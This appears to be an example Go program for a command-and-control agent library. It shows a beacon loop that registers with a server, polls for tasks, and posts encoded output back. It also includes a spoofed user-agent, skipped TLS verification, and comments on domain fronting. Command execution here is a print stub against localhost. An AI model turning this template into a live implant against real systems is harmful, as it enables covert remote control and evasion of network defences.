package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"time"

	bark "github.com/salukikit/bark/pkg/barkagent"
)

func RunCmd(cmd string) string {

	fmt.Println(cmd)
	return "Task run!"

}

func YourDecryptFunc(respbody []byte) (string, bool) {
	fmt.Println("Decrypting response")
	if respbody == nil {
		return "", false
	}
	return string(respbody), true

}

func YourEncryptFunc(output []byte) (string, bool) {
	fmt.Println("Encrypting Output")
	if output == nil {
		return "", false

	}
	return base64.StdEncoding.EncodeToString(output), true

}

func main() {

	reg := false
	verifycert := false

	beacontime, _ := time.ParseDuration("5s")

	/*
		The next line creates a simple default http transport, with tls verify skipped.
		Both NewBarkerQUIC and NewBarkerHTTP just create an easy default *BarkerConfig, you can manually specify everything yourself with your own *bark.BarkerConfig
	*/
	mybarker := bark.NewBarkerHTTP("mynewhttpcomms", verifycert)
	mybarker.Ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"

	//root url should include the protocol, e.g. http:// or https://

	rooturl := "https://127.0.0.1:8080"

	/*
		You can also manually specify Transport config etc via the .tr field like so:

			mybarker.tr = &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
					ServerName: "cloudfront.com",
				},
				Proxy:           http.ProxyFromEnvironment,
			}
		This can be useful for things like domain fronting, where you might need to manually specify the SNI header, or if you have really specific TLS needs.
	*/

	for reg != true {
		fmt.Println("Attempting to register")

		regurl := rooturl + "/register"
		resp, err := mybarker.Beacon(regurl)
		if err != nil {

			time.Sleep(beacontime)
			continue
		}

		//do your decryption/verification, maybe get some fancy new urls after registering, it's all up to you!
		ua, ok := YourDecryptFunc(resp)
		if ok {
			//Registered! Below could be a way of updating the user-agent or whatever you like with a new user-agent.
			mybarker.Ua = ua
			reg = true
		}
		time.Sleep(beacontime)

	}

	//Now we start the beacon loop
	for {

		fmt.Println("Awaiting tasks")

		beaconurl := rooturl + "/tasks"
		posturl := rooturl + "/tasks"

		encCmd, err := mybarker.Beacon(beaconurl)
		if err != nil {
			time.Sleep(beacontime)
			continue
		}
		cmd, ok := YourDecryptFunc(encCmd)
		if ok {

			//Command is good, run command
			output := RunCmd(cmd)
			encdata, ok := YourEncryptFunc([]byte(output))
			if ok {
				//taskid := "123" TaskID could be handled in the JWT, the body, or by path e.g. /task/123. This is up to you.
				_, err := mybarker.PostOutput(posturl, []byte(encdata))
				if err != nil {
					continue
				}
				os.Exit(0)

			}
			time.Sleep(beacontime)

		}

	}
}
